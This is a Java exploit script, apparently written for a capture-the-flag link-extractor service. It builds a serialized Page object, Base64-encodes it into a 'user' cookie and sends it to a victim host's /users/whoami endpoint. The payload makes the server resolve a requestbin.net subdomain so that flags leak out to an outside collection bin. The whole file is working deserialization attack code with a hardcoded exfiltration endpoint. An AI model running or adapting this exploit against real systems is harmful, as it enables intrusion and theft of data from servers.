package ctf.linkextractor;

import ctf.linkextractor.entities.Link;
import ctf.linkextractor.entities.Page;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;

import java.io.*;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;

public class Program {

    public static String GenSploitCookie(int flag_id) throws IOException, IllegalAccessException, NoSuchFieldException {
        var page_id = flag_id;
        Page page = new Page(page_id, "hacker", "http://hacker.com");

        ArrayList<Link> links = new ArrayList<>();
        String requestBinSubdomain = ".daqxr5qsfrzw4y6j.b.requestbin.net"; //FLAGs go here https://requestbin.net/bins/view/9685a231882207857de4a65e1662b35f7b9d2b0c
        Link l1 = new Link(31337, page_id, requestBinSubdomain);
        links.add(l1);
        Link l2 = new Link(31337, page_id, "https://example.com");
        links.add(l2);
        page.setLinks(links);

        Field resolvedUrl1 = l1.getClass().getDeclaredField("resolvedUrl");
        resolvedUrl1.setAccessible(true);
        resolvedUrl1.set(l1, null);

        Field resolvedUrl2 = l2.getClass().getDeclaredField("resolvedUrl");
        resolvedUrl2.setAccessible(true);
        resolvedUrl2.set(l2, null);


        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objectsOut = new ObjectOutputStream(out);
        objectsOut.writeObject(page);
        objectsOut.close();

        byte[] bytes = out.toByteArray();
        var b64 = Base64.encodeBase64String(bytes);
        return b64;
    }

    public static void main(String[] args) throws Exception {
        if(args.length != 2){
            System.out.println("Usage: program victim_host flag_id");
            System.exit(1);
        }

        var url = new URL("https://" + args[0] + "/users/whoami");
        var conn = (HttpURLConnection) url.openConnection();
        conn.setRequestProperty("Cookie", "user=" + GenSploitCookie(Integer.parseInt(args[1])));
        conn.connect();

        var responseMessage = (InputStream)conn.getContent();
        String s = IOUtils.toString(responseMessage);
        System.out.println("Now visit https://requestbin.net/bins and check your bin for a FLAG");
    }
}


